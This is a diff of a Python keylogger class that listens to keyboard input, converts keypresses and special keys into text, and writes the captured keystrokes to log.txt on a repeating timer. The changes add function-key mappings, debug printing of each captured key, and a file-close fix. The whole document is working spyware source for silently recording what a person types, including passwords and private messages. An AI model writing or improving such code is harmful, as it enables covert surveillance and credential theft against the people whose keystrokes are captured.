@@ -4,8 +4,6 @@ from threading import Timer
 from datetime import datetime
 from time import sleep
 
-
-
 class Keylogger:
     def __init__(self,interval):
         self.interval = interval
@@ -16,12 +14,17 @@ class Keylogger:
         listener.start()
         sleep(self.interval)
         self.writeLog()
-
     def on_press(self, key):
-        specialKeys = {"None":"", "Key.num_lock":"num_lock", "Key.pause":"", "Key.scroll_lock":"scroll_lock", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "caps_lock", "Key.tabNone" : "", "Key.enter": "enter" }
+        specialKeys = {"None":"", "Key.esc":"" , "Key.f1":"" , "Key.f2":"" , "Key.f3":"" , "Key.f4":"" , "Key.f5":"" , "Key.f6":"" , "Key.f7":"" , "Key.f8":"" , "Key.f9":"" , "Key.f10":"" , "Key.f11":"" , "Key.f12":"" , "Key.num_lock":"", "Key.pause":"", "Key.scroll_lock":"", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "CAPS_LOCK", "Key.tabNone" : "", "Key.enter": " ENTER " }
+        noneKey = {"None":""}
         try:
-            self.log += str(key.char)
+            if str(key.char) in noneKey:
+                self.log += noneKey[str(key.char)]
+            else:
+                self.log += str(key.char)
+            print("TRY:" + str(key.char))
         except AttributeError:
+            print("Except:" + str(key))
             if str(key) in specialKeys:
                 # print(str(key))
                 self.log += specialKeys[str(key)]
@@ -39,6 +42,7 @@ class Keylogger:
         f = open("log.txt","a")
         f.write(logC)
         f.write("\n")
+        f.close()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.writeLog)
         # timer.daemon = True
